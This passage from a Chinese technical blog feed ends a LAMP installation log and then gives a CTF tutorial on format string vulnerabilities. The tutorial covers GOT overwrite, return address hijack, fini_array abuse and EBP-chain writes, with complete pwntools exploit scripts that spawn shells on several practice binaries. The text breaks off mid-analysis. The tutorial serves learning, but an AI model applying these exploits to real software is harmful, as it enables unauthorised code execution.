title="设置mysql密码"></a>设置mysql密码</h3><pre><code>[root@localhost mysql-5.5.23]# /usr/local/mysql/bin/mysqladmin -u root password &quot;123456&quot;[root@localhost mysql-5.5.23]# /usr/local/mysql/bin/mysql -u root -p</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/yHAmIC.png" srcset="/img/loading.gif" alt><br>成功了。注意 <code>history -c</code> 清楚历史记录命令。<br><img src="http://qiqianyun.chumen77.xyz/uPic/SeHAFf.png" srcset="/img/loading.gif" alt><br>服务都正常，字符集格式也在。</p><h2 id="php"><a href="#php" class="headerlink" title="php"></a>php</h2><h3 id="准备工作-2"><a href="#准备工作-2" class="headerlink" title="准备工作"></a>准备工作</h3><pre><code>[root@localhost mysql]# yum -y install libtool*[root@localhost local]# yum -y install libpng-devel</code></pre><p>让php支持数据库的内容：</p><pre><code>[root@localhost mysql]# vim /usr/local/gd2/include/gd_io.h</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/MGWJ0l.png" srcset="/img/loading.gif" alt></p><h3 id="开始安装-1"><a href="#开始安装-1" class="headerlink" title="开始安装"></a>开始安装</h3><pre><code>[root@localhost php-5.4.25]# ./configure --prefix=/usr/local/php/ --with-config-file-path=/usr/local/php/etc/ --with-apxs2=/usr/local/apache2/bin/apxs --with-mysql=/usr/local/mysql --with-libxml-dir=/usr/local/libxml2 --with-jpeg-dir=/usr/local/jpeg6/ --with-png-dir=/usr/local/libpng/ --with-freetype-dir=/usr/local/freetype/ --with-gd=/usr/local/gd2/ --with-mcrypt=/usr/local/libmcrypt/ --with-mysqli=/usr/local/mysql/bin/mysql_config --enable-soap --enable-mbstring=all --enable-sockets --with-pdo-mysql=/usr/local/mysql --without-pear</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/6P6yZd.png" srcset="/img/loading.gif" alt></p><pre><code>[root@localhost php-5.4.25]# make</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/1rlM0o.png" srcset="/img/loading.gif" alt></p><pre><code>[root@localhost php-5.4.25]# make install</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/PcwG4a.png" srcset="/img/loading.gif" alt></p><h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><pre><code>[root@localhost php-5.4.25]# mkdir /usr/local/php/etc[root@localhost php-5.4.25]# cp php.ini-production /usr/local/php/etc/php.ini</code></pre><p>复制主配置文件到<code>/usr/local/php/etc</code></p><pre><code>[root@localhost php-5.4.25]# vi /usr/local/apache2/etc/httpd.conf</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/v9mdSe.png" srcset="/img/loading.gif" alt><br>修改apache2配置，让其也可以支持php</p><p>重启apache2:</p><pre><code>[root@localhost php-5.4.25]# /usr/local/apache2/bin/apachectl stopAH00558: httpd: Could not reliably determine the server&#39;s fully qualified domain name, using localhost.localdomain. Set the &#39;ServerName&#39; directive globally to suppress this message[root@localhost php-5.4.25]# /usr/local/apache2/bin/apachectl startAH00558: httpd: Could not reliably determine the server&#39;s fully qualified domain name, using localhost.localdomain. Set the &#39;ServerName&#39; directive globally to suppress this message</code></pre><p>restart 可能是无效的。</p><h3 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h3><h4 id="apache与php"><a href="#apache与php" class="headerlink" title="apache与php"></a>apache与php</h4><p><img src="http://qiqianyun.chumen77.xyz/uPic/Jp7nIv.png" srcset="/img/loading.gif" alt></p><pre><code>[root@localhost htdocs]# vi index.php</code></pre><p>写一个php探针：</p><pre><code>&lt;?php        phpinfo();?&gt;</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/zgJ5wo.png" srcset="/img/loading.gif" alt></p><h4 id="apache与MySQL"><a href="#apache与MySQL" class="headerlink" title="apache与MySQL"></a>apache与MySQL</h4><pre><code class="php">&lt;?php$link=mysql_connect(&#39;localhost&#39;,&#39;root&#39;,&#39;123456&#39;);if($link) echo &quot;Congratulations!!!!!!&quot;;mysql_close();?&gt;</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/RQRH44.png" srcset="/img/loading.gif" alt></p><h3 id="phpadmin搭建"><a href="#phpadmin搭建" class="headerlink" title="phpadmin搭建"></a>phpadmin搭建</h3><pre><code>[root@localhost lamp1]# cp -r phpMyAdmin-4.1.4-all-languages /usr/local/apache2/htdocs/phpmyadmin</code></pre><h4 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h4><pre><code>[root@localhost phpmyadmin]# cp config.sample.inc.php config.inc.php[root@localhost phpmyadmin]# vi config.inc.php</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/T9QoLf.png" srcset="/img/loading.gif" alt><br>访问测试：<br><img src="http://qiqianyun.chumen77.xyz/uPic/UK2Vd0.png" srcset="/img/loading.gif" alt></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Lamp搭建记录&quot;&gt;&lt;a href=&quot;#Lamp搭建记录&quot; class=&quot;headerlink&quot; title=&quot;Lamp搭建记录&quot;&gt;&lt;/a&gt;Lamp搭建记录&lt;/h1&gt;&lt;h2 id=&quot;准备工作&quot;&gt;&lt;a href=&quot;#准备工作&quot; class=&quot;headerlink&quot; 
      
    
    </summary>
    
    
      <category term="linux" scheme="http://chumen77.xyz/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>格式化字符串漏洞小总结（下）</title>
    <link href="http://chumen77.xyz/2020/04/03/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%B0%8F%E6%80%BB%E7%BB%93%EF%BC%88%E4%B8%8B%EF%BC%89/"/>
    <id>http://chumen77.xyz/2020/04/03/格式化字符串漏洞小总结（下）/</id>
    <published>2020-04-03T08:59:50.107Z</published>
    <updated>2020-06-27T14:27:05.139Z</updated>
    
    <content type="html"><![CDATA[<h1 id="格式化字符串漏洞小总结（下）"><a href="#格式化字符串漏洞小总结（下）" class="headerlink" title="格式化字符串漏洞小总结（下）"></a>格式化字符串漏洞小总结（下）</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>接着上一篇，这一篇主要记录一下对于这个漏洞的利用和ctf赛题中常见的套路和考法。</p><h2 id="格式化字符串在栈上"><a href="#格式化字符串在栈上" class="headerlink" title="格式化字符串在栈上"></a>格式化字符串在栈上</h2><h3 id="劫持got"><a href="#劫持got" class="headerlink" title="劫持got"></a>劫持got</h3><ul><li>每次 call libc 中的函数时都会去GOT表中查询来找出程序下一步要jmp的位址</li><li>可以通过 fmt 构造写入一个目标地址，改掉 GOT 表上的地址使得call该函数时变成jmp到我们要的目标地址去<br>例如 ：<br>将 printf 改成 system，原本 printf (“sh’’）就直接变成 system (“sh”),便可以拿到shell。<br>￼<br><img src="http://qiqianyun.chumen77.xyz/uPic/0G62iR.png" srcset="/img/loading.gif" alt><br>这一攻击过程可以分为以下几个步骤：</li><li>确定一下printf函数的GOT表的地址，如图中是<code>0x804a010</code></li><li>确定一下system函数的内存地址或者plt（通常都需要泄漏一下libc的基地址，然后加上偏移算出，当然也会遇到程序直接存在system函数，那么就是plt）</li><li>在栈上构造出printf函数GOT表的地址</li><li>利用fmt漏洞修改printf函数GOT表上的地址</li></ul><p>然后看一个例题：</p><h4 id="inndy-echo"><a href="#inndy-echo" class="headerlink" title="inndy-echo"></a>inndy-echo</h4><h5 id="保护和arch"><a href="#保护和arch" class="headerlink" title="保护和arch"></a>保护和arch</h5><pre><code>    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x8048000)</code></pre><h5 id="ida分析"><a href="#ida分析" class="headerlink" title="ida分析"></a>ida分析</h5><pre><code class="c">int __cdecl __noreturn main(int argc, const char **argv, const char **envp){  char s; // [esp+Ch] [ebp-10Ch]  unsigned int v4; // [esp+10Ch] [ebp-Ch]  v4 = __readgsdword(0x14u);  setvbuf(stdin, 0, 2, 0);  setvbuf(stdout, 0, 2, 0);  do  {    fgets(&amp;s, 256, stdin);    printf(&amp;s);  }  while ( strcmp(&amp;s, &quot;exit\n&quot;) );  system(&quot;echo Goodbye&quot;);  exit(0);}</code></pre><p>可以看到会无限的打印你输入的东西，那就意味着可以无限次触发这个漏洞。并且还有system这个函数，那可以直接找其plt。</p><h6 id="攻击思路："><a href="#攻击思路：" class="headerlink" title="攻击思路："></a>攻击思路：</h6><ul><li>在栈上放好printf函数的GOT表地址，并确定一下偏移</li><li>改这个GOT上的地址为system函数的plt</li><li>改好一会，传送一个<code>/bin/sh</code>，此时就会变成<code>system(/bin/sh)</code></li></ul><p>在执行的过程中需要注意一下，改GOT表上的值<strong>要单次printf多次写入</strong>，否则只改一般程序会出现无法预料的情况。还有就是需要注意一下<strong>字节对齐</strong>。</p><h5 id="gdb调试"><a href="#gdb调试" class="headerlink" title="gdb调试"></a>gdb调试</h5><pre><code>gdb-peda$ stack 0x200000| 0xffffd250 --&gt; 0xffffd26c (&quot;AAAA\n&quot;)0004| 0xffffd254 --&gt; 0x1000008| 0xffffd258 --&gt; 0xf7fb25a0 --&gt; 0xfbad208b0012| 0xffffd25c --&gt; 0x00016| 0xffffd260 --&gt; 0xf7ffd000 --&gt; 0x23f400020| 0xffffd264 --&gt; 0x80482e7 (&quot;__libc_start_main&quot;)0024| 0xffffd268 --&gt; 0xf63d4e2e0028| 0xffffd26c (&quot;AAAA\n&quot;)</code></pre><pre><code>gdb-peda$ fmtarg 0xffffd26cThe index of format argument : 7 (&quot;\%6$p&quot;)</code></pre><p>确定偏移是7，但需要注意字节对齐，打算一会在写payload时候，就<code>().ljust</code>补成0x20的<code>a</code>，也就是<code>offset = 7 + 0x20/4 = 15</code></p><h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><pre><code class="python">from pwn import *context.log_level = &#39;debug&#39;context.arch = &#39;i386&#39;# io = process(&#39;./echo&#39;)io = remote(&#39;node3.buuoj.cn&#39;,26990)system_plt = 0x08048400printf_got = 0x0804A010def fmt_short(prev,val,idx,byte = 2):    result = &quot;&quot;    if prev &lt; val :        result += &quot;%&quot; + str(val - prev) + &quot;c&quot;    elif prev == val :        result += &#39;&#39;    else :        result += &quot;%&quot; + str(256**byte - prev + val) + &quot;c&quot;    result += &quot;%&quot; + str(idx) + &quot;$hn&quot;    return resultprev = 0 payload = &quot;&quot;key = 0x08048400for i in range(2):    payload +=fmt_short(prev,(key &gt;&gt; 16*i) &amp; 0xffff,15+i)     prev = (key &gt;&gt; i*16) &amp; 0xffffpayload = payload.ljust(0x20,&#39;a&#39;) + p32(printf_got) + p32(printf_got+2)raw_input(&#39;-&gt;&#39;)io.sendline(payload)io.send(&#39;/bin/sh\x00&#39;)io.interactive()</code></pre><p>换一种就是用pwntools中针对格式化字符串漏洞利用模块中的函数<code>fmtstr_payload</code>，面对32位，这种情况还是很好用的：</p><pre><code class="python">from pwn import *context.log_level = &#39;debug&#39;context.arch = &#39;i386&#39;# io = process(&#39;./echo&#39;)io = remote(&#39;node3.buuoj.cn&#39;,26990)system_plt = 0x08048400printf_got = 0x0804A010payload = fmtstr_payload(7,{printf_got : system_plt})io.sendline(payload)io.send(&#39;/bin/sh\x00&#39;)io.interactive()</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/TxIVwQ.png" srcset="/img/loading.gif" alt><br>可以看一下其生成的payload，把目标地址信息放在开头，在64位是肯定是不可行的。（不过听说pwntools的新版本是已经支持64位了，但是本人一直没有更新成功，所以也没有测试）</p><h3 id="劫持retaddress"><a href="#劫持retaddress" class="headerlink" title="劫持retaddress"></a>劫持retaddress</h3><p>顾名思议，就是利用格式化串漏洞来修改函数的返回地址到我们想要jmp的地址。常见套路：</p><ul><li>jmp到带有<code>system(/bin/sh)</code> 的后门函数</li><li>不开nx保护，jmp到自己构造的shellcode上。</li><li>提前泄漏libc算出libc的base，jmp到onegadget地址</li></ul><p>看一个简单的例子：</p><h4 id="三个白帽-pwnme-k0"><a href="#三个白帽-pwnme-k0" class="headerlink" title="三个白帽 - pwnme-k0"></a>三个白帽 - pwnme-k0</h4><h5 id="保护和arch-1"><a href="#保护和arch-1" class="headerlink" title="保护和arch"></a>保护和arch</h5><pre><code>    Arch:     amd64-64-little    RELRO:    Full RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x400000)</code></pre><p>64位程序，且开启了RELRO保护，这样就无法修改got表了。</p><h5 id="ida分析-1"><a href="#ida分析-1" class="headerlink" title="ida分析"></a>ida分析</h5><p>这个程序实现了一个注册用户的功能，注册好后可以来展示用户信息，修改用户信息，和退出程序。其中在展示用户信息当中，存在格式化字符串漏洞：</p><pre><code class="c">int __fastcall sub_400B07(char format, __int64 a2, __int64 a3, __int64 a4, __int64 a5, __int64 a6, char formata, __int64 a8, __int64 a9){  write(0, &quot;Welc0me to sangebaimao!\n&quot;, 0x1AuLL);  printf(&amp;formata, &quot;Welc0me to sangebaimao!\n&quot;);  return printf(&amp;a9 + 4);}</code></pre><p>并且发现其中输出的buf就是你输入的密码：<br><img src="http://qiqianyun.chumen77.xyz/uPic/o8t1UX.png" srcset="/img/loading.gif" alt></p><p>还发现其中有个后门函数：<br><img src="http://qiqianyun.chumen77.xyz/uPic/lRHun0.png" srcset="/img/loading.gif" alt></p><p>会调用system函数给你shell，那攻击思路也就是去修改程序中某个函数的返回地址，直接返回到这里就拿到shell了。</p><h5 id="gdb调试："><a href="#gdb调试：" class="headerlink" title="gdb调试："></a>gdb调试：</h5><p>定位到这个存在漏洞的printf当中，确定一下：<br><img src="http://qiqianyun.chumen77.xyz/uPic/MsdWDQ.png" srcset="/img/loading.gif" alt><br>看一下此时的栈情况，输入的usename可以确定偏移是8，并且rdi也是指向了存放password的地址。</p><p>然后发现栈上也有很多栈的地址信息，当程序第二次运行到这里的时候，发现这里esp对应的地址信息也是不会变的。所以就可以通过泄漏这里的值来算出存放ret address的栈地址。</p><p>然后让程序运行到修改用户信息的函数，这下把ret address的point放到栈上，接着就可以开始修改ret address的值了。</p><h5 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h5><pre><code class="python">from pwn import *context.log_level = &#39;debug&#39;context.arch = &#39;amd64&#39;io = process(&#39;./pwnme_k0&#39;)# context.clear(arch = &#39;amd64&#39;)io.recvuntil(&#39;lenth:20): \n&#39;)io.sendline(&#39;%0006$lx&#39;)io.recvuntil(&#39;lenth:20): \n&#39;)io.sendline(&#39;11111111&#39;)io.recvuntil(&#39;&gt;&#39;)io.sendline(&#39;1&#39;)# io.recvuntil(&#39;Welc0me to sangebaimao!\n&#39;)stack = int(io.recvline_contains(&#39;7f&#39;),16)print(stack)ret_add = stack - 0x38# system_add = 0x04008AApayload = &#39;%2218c%8$hn&#39;io.recvuntil(&#39;&gt;&#39;)io.sendline(&#39;2&#39;)io.recvuntil(&#39;lenth:20): \n&#39;)io.sendline(p64(ret_add))io.recvuntil(&#39;lenth:20): \n&#39;)io.sendline(payload)io.recvuntil(&#39;&gt;&#39;)io.sendline(&#39;1&#39;)io.interactive()</code></pre><h3 id="修改FINI-ARRAY区"><a href="#修改FINI-ARRAY区" class="headerlink" title="修改FINI_ARRAY区"></a>修改<code>FINI_ARRAY</code>区</h3><p>在上面的两个例子中可以发现,之所以能成功利用格式化字符串漏洞getshell,很多时候都是因为程序中存在循环，让我们可以多次触发格式化字符串漏洞。如果程序中不存在循环呢?利用ROP劫持函数返回地址到start可以实现；当存在格式化字符串漏洞时，使用这个漏洞也做到这一<br>点。</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/NgjlR4.png" srcset="/img/loading.gif" alt><br>简单地说,一个程序在调用 main函数前会调用<code>.init</code>段代码和 <code>.init_array</code> 段的函数数组中每一个函数指针。同样的,main 函数结束后也会调用<code>.fini</code>段代码和 <code>.fini_arrary</code> 段的函数数组中的每一个函数指针。</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/ioam7T.png" srcset="/img/loading.gif" alt><br>其中<code>FINI_ARRAY</code>区：程序结束需要经过这里，是可以修改一下这里的析构函数。修改<code>.fini_array</code>区的第一个元素为start，就可以实现让程序从头再来一次，也就又可以用一次漏洞。</p><p>需要注意的是,这个区的内容在再次从start开始执行后又会被修改。</p><h4 id="mma-ctf-2nd-2016-greeting"><a href="#mma-ctf-2nd-2016-greeting" class="headerlink" title="mma-ctf-2nd-2016-greeting"></a>mma-ctf-2nd-2016-greeting</h4><h5 id="保护和arch-2"><a href="#保护和arch-2" class="headerlink" title="保护和arch"></a>保护和arch</h5><pre><code>    Arch:     i386-32-little    RELRO:    No RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      No PIE (0x8048000)</code></pre><h5 id="ida分析-2"><a href="#ida分析-2" class="headerlink" title="ida分析"></a>ida分析</h5><pre><code class="c">int __cdecl main(int argc, const char **argv, const char **envp){  char s; // [esp+1Ch] [ebp-84h]  char v5; // [esp+5Ch] [ebp-44h]  unsigned int v6; // [esp+9Ch] [ebp-4h]  v6 = __readgsdword(0x14u);  printf(&quot;Please tell me your name... &quot;);  if ( !getnline(&amp;v5, 64) )    return puts(&quot;Don&#39;t ignore me ;( &quot;);  sprintf(&amp;s, &quot;Nice to meet you, %s :)\n&quot;, &amp;v5);  return printf(&amp;s);}</code></pre><p>发现函数在触发格式化字符串漏洞以后就结束了，没有在调用其他的函数，也就无法利用GOT劫持或者修改ret addr。<br>再看下getnline函数：</p><pre><code class="c">size_t __cdecl getnline(char *s, int n){  char *v3; // [esp+1Ch] [ebp-Ch]  fgets(s, n, stdin);  v3 = strchr(s, 10);  if ( v3 )    *v3 = 0;  return strlen(s);}</code></pre><p>发现有了strlen的函数，并且其参数也是可以控制的。<br>这就有了攻击思路，在触发格式化字符串的漏洞时：</p><ul><li>修改<code>.fini_array</code>区的一个函数指针地址为start，让其重启跑一次程序</li><li>因为知道肯定会跑到strlen那里，所以在劫持strlen的GOT为system</li><li>待程序重新跑起来，就在传送一个<code>/bin/sh</code>即可</li></ul><p>注意的是,这个<code>.fini_array</code>区的内容在再次从start开始执行后又会被修改,且程序可读取的字节数有限,因此需要同时修改两个地址，也就是单次printf多次写入，这个题并且需要合理调整payload。</p><h5 id="gdb调试-1"><a href="#gdb调试-1" class="headerlink" title="gdb调试"></a>gdb调试</h5><p><img src="http://qiqianyun.chumen77.xyz/uPic/wRVcqD.png" srcset="/img/loading.gif" alt><br>这个题目因为前面有</p><pre><code class="c">sprintf(&amp;s, &quot;Nice to meet you, %s :)\n&quot;, &amp;v5);</code></pre><p>所以其栈上会放上<code>Nice to meet you,</code>的字符串，此时需要注意对齐。对齐后发现偏移为12，在写payload的时候可以使用单次printf多次写入的脚本，所以来<code>().ljust(0x32,&#39;a&#39;)</code> ,所以偏移需要加上<code>(0x32 - 2)/4</code> =  24 </p><h5 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h5><pre><code class="python">from pwn import *context.arch = &#39;i386&#39;context.log_level = &#39;debug&#39;io = process(&#39;./greeting&#39;)# io = remote(&#39;111.198.29.45&#39;,42729)elf = ELF(&#39;./greeting&#39;)strlen_got = 0x08049A54fini_array = 0x08049934start = 0x080484F0system_plt = 0x08048490offset = 12def fmt_short(prev,val,idx,byte = 2):    result = &quot;&quot;    if prev &lt; val :        result += &quot;%&quot; + str(val - prev) + &quot;c&quot;    elif prev == val :        result += &#39;&#39;    else :        result += &quot;%&quot; + str(256**byte - prev + val) + &quot;c&quot;    result += &quot;%&quot; + str(idx) + &quot;$hn&quot;    return resultkey1 = 0x08048490prev = 18 #注意这个题在可控格式化字符串前有字符输出payload = &quot;&quot;for i in range(2):    payload +=fmt_short(prev,(key1 &gt;&gt; 16*i) &amp; 0xffff,24+i)     prev = (key1 &gt;&gt; i*16) &amp; 0xffffkey2 = 0x84F0for i in range(1):    payload +=fmt_short(prev,(key2 &gt;&gt; 16*i) &amp; 0xffff,26+i)     prev = (key2 &gt;&gt; i*16) &amp; 0xffffpayload = payload.ljust(0x32,&#39;a&#39;)payload += p32(strlen_got) + p32(strlen_got+2) +p32(fini_array)io.recvuntil(&#39;name...&#39;)raw_input(&#39;-&gt;&#39;)io.sendline(payload)io.recvuntil(&#39;name...&#39;)io.sendline(&#39;/bin/sh\x00&#39;)io.interactive()</code></pre><h3 id="小tips"><a href="#小tips" class="headerlink" title="小tips"></a>小tips</h3><h4 id="绕过canary"><a href="#绕过canary" class="headerlink" title="绕过canary"></a>绕过canary</h4><p>可以利用fmt漏洞，任意读的特性，在有canary的程序中，算好偏移以后读出canary存的检验值（基本都是以00结尾比较好找），然后在buffer overflow 时，在对应位置填上canary检验值，即可绕过canary。</p><h4 id="printf家族的其他函数"><a href="#printf家族的其他函数" class="headerlink" title="printf家族的其他函数"></a>printf家族的其他函数</h4><p>首先要记得一点函数参数的入栈顺序，大多是从右到左依次入栈，在遇到其他的printf类函数，在确定偏移时，一定要要把握fmt是在栈上的那个位置，然后进行计算偏移（不能简单的利用pwndbg的fmtarg了）。</p><ul><li>fprintf：基本上一样，只是format string 不在第一参数，使得overwrite function table 时很难使用</li><li>sprintf：可以用%xxc 来造成新的buffer overflow </li></ul><h4 id="劫持-stack-chk-fail"><a href="#劫持-stack-chk-fail" class="headerlink" title="劫持__stack_chk_fail"></a>劫持<code>__stack_chk_fail</code></h4><ul><li>在无法 stack overflow 也没有其它函数可以劫持时，可以使用修改<code>__stack_chk_fail</code> 的 G0T 并且破坏 canary 使这个函数被call，然后jmp想要的目标地址</li><li>在只有一次 stack overflow+fmt 时可以将<code>__stack_chk_fail</code>改成直接ret ，这样stack overflow 时可以无视canary ，也可以放上ROP链，进而进入之后的ROP。</li></ul><h2 id="格式化字符串不在栈上"><a href="#格式化字符串不在栈上" class="headerlink" title="格式化字符串不在栈上"></a>格式化字符串不在栈上</h2><p>有时候并不会这么刚好 format string 的 buf 在栈上当其在 data, bss 或是 heap 上的情况，无法在 stack 中放上一个 address 给任意读写的时候，可以使用在  stack 上现有的 pointer 进行写值。其中最常用的就是栈上现有的EBP链。</p><h3 id="EBP链"><a href="#EBP链" class="headerlink" title="EBP链"></a>EBP链</h3><p><img src="http://qiqianyun.chumen77.xyz/uPic/Y9ykIj.png" srcset="/img/loading.gif" alt></p><p>正如这个图，当一个程序完成了由main—&gt;A—&gt;B的函数调用，栈上就会存在一个EBP链，像图中的ebp3(B)—&gt;ebp2(A)—&gt;ebp1(main)，然后</p><ul><li>通过找准offset1(算一下ebp3与fmt字符串距离)对EBP2使用%hhn，就可以修改到EBP1的最低位，使得EBP1在一个256的范围内进行变化，可以改成你想要修改的栈内存单元指针（比如ret address的栈指针）。</li><li>改写好EBP1后，找准offset2 (算一下EBP2与fmt字符串距离)再对EBP1使用%hhn或者%hn，即可完成对你想要修改的地址的写值。</li></ul><p>简单来说，这个攻击过程就是第一次使用漏洞是构造出我们要读写的地址，再一次则是对前面构造出来的地址进行任意读写。但需要注意的是，<strong>在这个过程当中一定要学会对栈上的已有数据的灵活的运用</strong>。</p><p>接下来看一个题来仔细分析一下</p><h4 id="hitcontraining-playfmt"><a href="#hitcontraining-playfmt" class="headerlink" title="hitcontraining-playfmt"></a>hitcontraining-playfmt</h4><h5 id="保护和arch-3"><a href="#保护和arch-3" class="headerlink" title="保护和arch"></a>保护和arch</h5><pre><code>    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX disabled    PIE:      No PIE (0x8048000)    RWX:      Has RWX segments</code></pre><p>没有任何保护。</p><h5 id="ida分析-3"><a href="#ida分析-3" class="headerlink" title="ida分析"></a>ida分析</h5><pre><code class="c">int do_fmt(){  int result; // eax  while ( 1 )  {    read(0, buf, 0xC8u);    result = strncmp(buf, &quot;quit&quot;, 4u);    if ( !result )      break;    printf(buf);  }  return result;}</code></pre><p>其中看到buf在bss段：<br><img src="http://qiqianyun.chumen77.xyz/uPic/HRvwJA.png" srcset="/img/loading.gif" alt><br>这就是不在栈上，不能跟前面的题目一样，直接在栈上写上地址，然后来完成攻击。</p><p>上层有main 和play函数，一共三层，且在第三层的do-fmt函数存在格式化字符串漏洞，让我们很方便的用ebp链来完成攻击。然后，有无限次的触发这个漏洞的机会。</p><p>攻击思路 ：因为没有开nx保护，可以用shellcode进行攻击。修改某个函数返回地址，然后提前在可控的buf合适的地方摆上shellcode，然后跳上去即可。</p><h5 id="gdb调试-2"><a href="#gdb调试-2" class="headerlink" title="gdb调试"></a>gdb调试</h5><p>定位到printf函数处：</p><pre><code>gdb-peda$ b *0x0804854FBreakpoint 1 at 0x804854f</code></pre><p>可以看一下此时的栈情况：<br><img src="http://qiqianyun.chumen77.xyz/uPic/lYT98n.png" srcset="/img/loading.gif" alt><br>esp寄存器：<br><img src="http://qiqianyun.chumen77.xyz/uPic/vpsR9A.png" srcset="/img/loading.gif" alt><br>这里就把<code>0xffffd338</code>叫做ebp3，<code>0xffffd348</code>为ebp2，<code>0xffffd358</code>为ebp1。</p><p>第一次修改：对ebp2使用<code>%xxhhn</code>修改ebp1为do-fmt函数的retaddr <code>0xffffd33c</code>的<strong>栈指针</strong>（这个栈指针可以通过leak一个栈地址，然后根据偏移算出来）</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/x0EjmA.png" srcset="/img/loading.gif" alt></p><p>第二次修改 ： 对ebp1使用<code>%xxhn</code> 修改retaddr <code>0x80485ad</code> 为你在buf处提前摆上的shellcode</p><p>这样程序在退出这个do-fmt函数就会jmp到shellcode上，这样就拿到shell了。</p><h4 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h4><pre><code class="python">from pwn import *import timecontext.log_level = &#39;debug&#39;context.arch = &#39;i386&#39;io = process(&#39;./ebp&#39;)# io = remote(&#39;node3.buuoj.cn&#39;,29994)buf = 0x0804a080 + 0x40 #0x804a0c0raw_input(&#39;-&gt;&#39;)io.sendline(&#39;%4$p&#39;)ret_stack_addr = int(io.recv(10),16) - 28print(&#39;leak ret_stack_addr:&#39;+hex(ret_stack_addr))key1 = int(str(hex(ret_stack_addr))[-2:],16)key2 = 0xa0c0payload = &#39;%{}c%4$hhn&#39;.format(key1)raw_input(&#39;-&gt;&#39;)io.sendline(payload)io.recv()payload = &#39;%{}c%12$hn&#39;.format(key2)payload = payload.ljust(0x40) payload +=  asm(shellcraft.sh())io.sendline(payload)io.interactive()</code></pre><p>这个题目就是很单纯的直接利用ebp链进行攻击即可。</p><p>然后再看一个有点不一样的题目：</p><h3 id="inndy-echo3"><a href="#inndy-echo3" class="headerlink" title="inndy-echo3"></a>inndy-echo3</h3><h4 id="保护和arch-4"><a href="#保护和arch-4" class="headerlink" title="保护和arch"></a>保护和arch</h4><pre><code>    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      No PIE (0x8048000)</code></pre><h4 id="ida分析-4"><a href="#ida分析-4" class="headerlink" title="ida分析"></a>ida分析</h4><p><img src="http://qiqianyun.chumen77.xyz/uPic/Z7hCmN.png" srcset="/img/loading.gif" alt><br><img src="http://qiqianyun.chumen77.xyz/uPic/OawGHm.png" srcset="/img/loading.gif" alt></p><p>这一处会让栈结构的情况变得无法预测。然后进入hardfmt：</p><pre><code class="c">  for ( i = 0; i &lt;= 4; ++i )  {    read(0, buff, 0x1000u);    printf(buff);  }</code></pre><p>这一处存在fmt漏洞，且往下看整个程序感觉没什么好利用的，没什么后门函数。那攻击思路就可以是：<strong>改printf的got表，然后在第5次传过去<code>/bin/sh</code>即可。</strong><br>（这个题目思路还是很简单的，但是栈的随机化，还有因为这个次数的限制，在实际操作过程中，要充分的利用每一次格式化字符串漏洞，让这个题目不是很容易做）</p><h4 id="gdb分析"><a href="#gdb分析" class="headerlink" title="gdb分析"></a>gdb分析</h4><p>定位到漏洞printf函数处：<br><img src="http://qiqianyun.chumen77.xyz/uPic/KPo7Ve.png" srcset="/img/loading.gif" alt><br>会发现这个情况是没有<strong>构成ebp链</strong>的，这个时候就需要咱们自己来仔细观察栈上的数据，然后来挑选合适的栈数据来进行利用。</p><p>因为栈情况不一样，可以选择最适合我们利用漏洞的栈空间来进行分析，这样做起来会简单一些。</p><p>我自己选择在偏移在43的时候开始进行分析，想办法来利用这个漏洞：<br><img src="http://qiqianyun.chumen77.xyz/uPic/8gciU0.png" srcset="/img/loading.gif" alt><br>仔细看下此时的栈情况 ，然后再次仔细分析下我们的目标 ：</p><ul><li>泄漏libc基址，计算出system的内存地址。</li><li>在栈上构造出printf的got地址和printf的got+2的地址（0x0804a014和0x0804a016）</li><li>在构造的got地址上，开始写system地址<br>由于这个漏洞可以的用的次数最多是4次，所以要尽可能利用每一次。</li></ul><p>如上图所示，很简单就可以泄漏出libc基址。<br>但是接下来怎么构造printf的got地址和printf的got地址+2的地址就有点难了。</p><p>此时注意图上前两个红框，可以发现把前二个红框<strong>虽不是ebp</strong>的链，但是这也是<strong>成一个链</strong>可以利用了。然后可以把第二个红框的两个地址修改为 第一个红框的两个栈指针：</p><p>这里可以用gdb直接来手动设置，让咱们上来就写exp调试还是挺费劲的：</p><pre><code>gdb-peda$ set *0xffbe5e6c = 0xffbe5d54gdb-peda$ set *0xffbe5e64 = 0xffbe5d60</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/KIrnCk.png" srcset="/img/loading.gif" alt></p><p>这个过程中在泄漏目标栈地址以后，是可以通过一次printf函数写入2次地址，实现这个栈情况的。</p><p>接着就可以构造got地址和got+2地址：</p><pre><code>gdb-peda$ set *0xffbe5d60  = 0x0804a016gdb-peda$ set *0xffbe5d54  = 0x0804a014</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/hma5RY.png" srcset="/img/loading.gif" 